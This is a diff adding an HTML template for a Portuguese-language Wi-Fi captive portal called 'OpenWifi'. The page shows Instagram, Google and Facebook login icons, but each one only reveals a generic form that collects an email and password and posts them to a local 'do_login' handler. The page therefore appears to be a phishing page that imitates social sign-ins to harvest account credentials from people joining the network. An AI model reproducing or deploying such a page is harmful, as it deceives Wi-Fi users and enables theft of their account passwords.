@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+<head>
+
+    <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <meta charset="utf-8">
+    <title>.:: OpenWifi ::.</title>
+    <meta name="description" content="Captive Portal">
+
+    <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- FONT
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <!-- <link href="//fonts.googleapis.com/css?family=Raleway:400,300,600" rel="stylesheet" type="text/css"> -->
+
+    <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    
+    <link rel="stylesheet" href="{{ url_for('static',filename='styles/normalize.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static',filename='styles/skeleton.css') }}">
+    
+
+    <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <link rel="icon" type="image/png" href="{{ url_for('static',filename='images/favicon.png') }}">
+
+</head>
+
+<body>
+    <!-- Primary Page Layout
+  ––––––––––––––––––––––––––––––––––––––––––––––––––  -->
+    <center>
+        <div class="containerImg">
+            <p><p><p>
+            <img width="20%" height="20%" src="{{ url_for('static',filename='images/pycaptive.png') }}">
+        </div>
+    </center>
+
+    <div class="container">
+        <center>
+
+            <div id="form_container">
+                <h1>Bem vindo!</h1>
+                <p>
+                Acesse com uma de suas contas...
+                <div>
+                    <input type="image" src="static/images/insta.png" data-element="#myform" class="btn-toggle" width="40px" height="40px"/>
+                    <input type="image" src="static/images/google.png" data-element="#myform" class="btn-toggle" width="40px" height="40px"/>
+                    <input type="image" src="static/images/face.png" data-element="#myform" class="btn-toggle" width="40px" height="40px"/>              
+                </div>
+                <form method="post" action="do_login" style="display: none;" id="myform">
+                    <table>
+                        <tr>
+                            <td>
+                                <div>
+                                    <input name="email" type="text" maxlength="255" value="" placeholder="email" required/>
+                                    <input name="password" type="password" maxlength="255" value=""  placeholder="password" required/>
+                                </div>
+                            </td>
+                        </tr>
+                    </table>
+                    <p><input id="saveForm" class="button_text" type="submit" name="submit" value="Enviar" /></p>
+                </form>
+                <center>
+            </div>
+            </center>
+            <script type="text/javascript" src="static/styles/jquery.min.js"></script>
+            <script type="text/javascript">
+                $(function(){
+                    $(".btn-toggle").click(function(e){
+                        e.preventDefault();
+                        el = $(this).data('element');
+                        $(el).toggle();
+                    });
+                });
+            </script>
+</body>
+
+</html>
